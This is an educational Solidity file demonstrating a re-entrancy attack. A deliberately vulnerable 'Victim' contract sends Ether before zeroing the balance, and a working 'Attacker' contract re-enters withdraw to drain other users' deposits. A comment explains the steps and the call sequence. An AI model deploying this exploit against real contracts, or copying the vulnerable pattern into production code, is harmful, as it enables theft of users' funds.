// SPDX-License-Identifier: MIT
// Author: Yaghoub Adelzadeh
// GitHub: https://www.github.com/dappteacher
pragma solidity ^0.8.24;

contract Victim {
    mapping(address => uint256) public balances;

    // Allows anyone to deposit Ether into the contract
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        // Ensures the contract has enough balance to withdraw
        require(amount > 0, "Insufficient balance");
        // Transfers the deposited amount back to the sender
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
        // Sets the sender's balance to zero after withdrawal
        balances[msg.sender] = 0;
    }
}

contract Attacker {
    // Instance of the Victim contract
    Victim public victim;

    constructor(Victim _etherStoreAddress) {
        // Initialize the victim instance with the provided address
        victim = _etherStoreAddress;
    }

    // Calls the deposit and withdraw functions of the Victim contract
    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    // Receives Ether and continues to call Victim.withdraw as long as the contract has balance
    receive() external payable {
        if (address(victim).balance >= msg.value) {
            victim.withdraw();
        }
    }
}

/*
Victim is a contract where you can deposit and withdraw Ether.
This contract is vulnerable to a re-entrancy attack.
Let's see why.

1. Deploy Victim.
2. Deposit 1 Ether each from Account 1 (Jacob) and Account 2 (Mary) into Victim.
3. Deploy Attacker with the address of Victim.
4. Call Attacker.attack, sending 1 Ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ethers stolen from Jacob and Mary,
   plus 1 Ether sent from this contract).

What happened?
The attack was able to call Victim.withdraw multiple times before
Victim.withdraw finished executing.

Here is how the functions were called:
- Attacker.attack
- Victim.deposit
- Victim.withdraw
- Attacker.receive (receives 1 Ether)
- Victim.withdraw
- Attacker.receive (receives 1 Ether)
- Victim.withdraw
- Attacker.receive (receives 1 Ether)
*/
